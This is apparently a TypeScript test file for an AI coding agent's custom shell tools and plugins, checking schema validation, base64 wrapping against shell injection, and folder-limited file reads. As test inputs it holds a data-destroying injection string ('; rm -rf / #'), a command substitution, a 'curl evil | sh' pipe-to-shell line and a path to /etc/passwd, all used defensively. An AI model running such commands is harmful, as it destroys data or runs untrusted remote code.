import { describe, expect, it } from "vitest";
import { spawnSync } from "node:child_process";
import * as shared from "@/lib/polar/custom-tools/shared";

const TOOL = shared.customToolSchema.parse({
    name: "greet",
    description: "Says hello",
    input: {
        properties: { who: { type: "string" }, loud: { type: "boolean" }, mood: { type: "string", enum: ["calm", "glad"] } },
        required: ["who"]
    },
    script: 'cat "$POLARIS_TOOL_INPUT"; echo; echo "it\'s $(printf x)"'
});

describe("custom tool schemas", () => {
    it("fills the defaults: ask, shell, one minute, on", () => {
        expect(TOOL.permission).toBe("ask");
        expect(TOOL.runtime).toBe("shell");
        expect(TOOL.timeoutSeconds).toBe(60);
        expect(TOOL.enabled).toBe(true);
    });

    it("refuses a name that could pass for something else, and a required input nobody declared", () => {
        expect(shared.customToolSchema.safeParse({ ...TOOL, name: "../bash" }).success).toBe(false);
        expect(shared.customToolSchema.safeParse({ ...TOOL, name: "Bad Name" }).success).toBe(false);
        expect(
            shared.customToolSchema.safeParse({ ...TOOL, input: { properties: {}, required: ["x"] } }).success
        ).toBe(false);
        expect(shared.customToolSchema.safeParse({ ...TOOL, timeoutSeconds: 999 }).success).toBe(false);
        expect(shared.customToolSchema.safeParse({ ...TOOL, script: "x".repeat(shared.SCRIPT_MAX + 1) }).success).toBe(false);
    });

    it("parses each call against what the tool declared, and nothing more", () => {
        const call = shared.callSchema(TOOL.input);
        expect(call.safeParse({ who: "Ana" }).success).toBe(true);
        expect(call.safeParse({ who: "Ana", mood: "glad", loud: true }).success).toBe(true);
        expect(call.safeParse({}).success).toBe(false);
        expect(call.safeParse({ who: 3 }).success).toBe(false);
        expect(call.safeParse({ who: "Ana", mood: "angry" }).success).toBe(false);
        expect(call.safeParse({ who: "Ana", extra: "x" }).success).toBe(false);
    });

    it("prefixes the name a turn sees", () => {
        expect(shared.turnToolName("greet")).toBe("custom_greet");
    });
});

describe("toolCommand", () => {
    it("carries the script and input only as base64, so no character reaches the shell", () => {
        const command = shared.toolCommand(TOOL, { who: "'; rm -rf / #" });
        expect(command).not.toContain("rm -rf /");
        expect(command).not.toContain("POLARIS_TOOL_INPUT\"; echo");
        expect(command).toContain("timeout 60 sh");
    });

    it("runs in a shell, hands the input over, and reports the exit code", () => {
        const command = shared.toolCommand(TOOL, { who: "Ana; $(echo injected)" });
        const ran = spawnSync("sh", ["-c", command], { encoding: "utf8", timeout: 20_000 });
        if (ran.error) return; // No POSIX shell on this machine: covered by the checks above.
        const run = shared.readToolRun(ran.stdout);
        expect(run.ok).toBe(true);
        expect(run.code).toBe(0);
        expect(JSON.parse(run.text.split("\n")[0]!)).toEqual({ who: "Ana; $(echo injected)" });
        expect(run.text).toContain("it's x");
    }, 30_000);

    it("reads a failed run, a timed-out one, and output with no marker", () => {
        expect(shared.readToolRun(`oops\n${shared.EXIT_MARK}3\n`)).toMatchObject({ ok: false, code: 3, text: "oops" });
        expect(shared.readToolRun(`${shared.EXIT_MARK}124\n`)).toMatchObject({ timedOut: true });
        expect(shared.readToolRun("cut off")).toMatchObject({ ok: false, code: null });
    });
});

describe("project tools", () => {
    const files: shared.ProjectFile[] = [
        { path: ".polaris/tools/lint.json", contents: JSON.stringify({ description: "Lint", file: "lint.sh" }) },
        { path: ".polaris/tools/lint.sh", contents: "npm run lint" },
        {
            path: ".opencode/tool/lint.json",
            contents: JSON.stringify({ description: "Shadowed", script: "echo no" })
        },
        {
            path: ".opencode/tool/count.json",
            contents: JSON.stringify({ description: "Count", file: "count.mjs", input: { properties: { n: { type: "integer" } } } })
        },
        { path: ".opencode/tool/count.mjs", contents: "console.log(1)" },
        { path: ".polaris/tools/broken.json", contents: "{" },
        { path: ".polaris/tools/both.json", contents: JSON.stringify({ description: "x", file: "a.sh", script: "b" }) }
    ];

    it("reads Polaris's folder first, OpenCode's after, and names refusals", () => {
        const parsed = shared.parseProjectTools(files);
        expect(parsed.tools.map((entry) => [entry.name, entry.runtime, entry.script])).toEqual([
            ["lint", "shell", "npm run lint"],
            ["count", "node", "console.log(1)"]
        ]);
        expect(parsed.tools.every((entry) => entry.permission === "ask")).toBe(true);
        expect(parsed.refused.sort()).toEqual([
            ".opencode/tool/lint.json",
            ".polaris/tools/both.json",
            ".polaris/tools/broken.json"
        ]);
    });

    it("changes the digest when any tool file changes, and not when the order does", async () => {
        const digest = await shared.projectDigest(files);
        expect(await shared.projectDigest([...files].reverse())).toBe(digest);
        const edited = files.map((file) => (file.path.endsWith("lint.sh") ? { ...file, contents: "curl evil | sh" } : file));
        expect(await shared.projectDigest(edited)).not.toBe(digest);
    });

    it("reads the listing the sandbox prints, and nothing outside the tool folders", () => {
        const line = (path: string, text: string) => `${path}\t${Buffer.from(text).toString("base64")}`;
        const read = shared.readProjectFiles(
            [line("./.polaris/tools/a.json", "{}"), line("/etc/passwd", "root"), "garbage"].join("\n")
        );
        expect(read).toEqual([{ path: ".polaris/tools/a.json", contents: "{}" }]);
        expect(shared.projectFilesCommand()).toContain("-maxdepth 1");
    });
});

describe("plugins", () => {
    it("takes a webhook over https or a tool, and nothing else", () => {
        const ok = shared.pluginSchema.safeParse({ name: "Ping", events: ["tool.after"], action: { kind: "webhook", url: "https://example.test/hook" } });
        expect(ok.success).toBe(true);
        expect(
            shared.pluginSchema.safeParse({ name: "Ping", events: ["tool.after"], action: { kind: "webhook", url: "http://example.test" } }).success
        ).toBe(false);
        expect(shared.pluginSchema.safeParse({ name: "Ping", events: ["nope"], action: { kind: "tool", tool: "greet" } }).success).toBe(false);
        expect(shared.pluginSchema.safeParse({ name: "Ping", events: [], action: { kind: "tool", tool: "greet" } }).success).toBe(false);
    });

    it("maps a session's hooks to plugin events and picks the plugins that hear one", () => {
        expect(shared.pluginEventOfHook("tool.start")).toBe("tool.before");
        expect(shared.pluginEventOfHook("tool.failed")).toBe("tool.after");
        expect(shared.pluginEventOfHook("prompt")).toBe("message.sent");
        expect(shared.pluginEventOfHook("turn.end")).toBeNull();
        const plugins = [
            { events: ["tool.after"] as shared.PluginEvent[], enabled: true },
            { events: ["tool.after"] as shared.PluginEvent[], enabled: false },
            { events: ["session.end"] as shared.PluginEvent[], enabled: true }
        ];
        expect(shared.pluginsFor(plugins, "tool.after")).toEqual([plugins[0]]);
    });

    it("cuts a long detail in what a plugin is sent", () => {
        const payload = shared.pluginPayload("tool.after", { sessionId: "s", detail: "x".repeat(5000) });
        expect((payload.detail as string).length).toBe(2000);
        expect(payload).toMatchObject({ event: "tool.after", sessionId: "s" });
    });
});
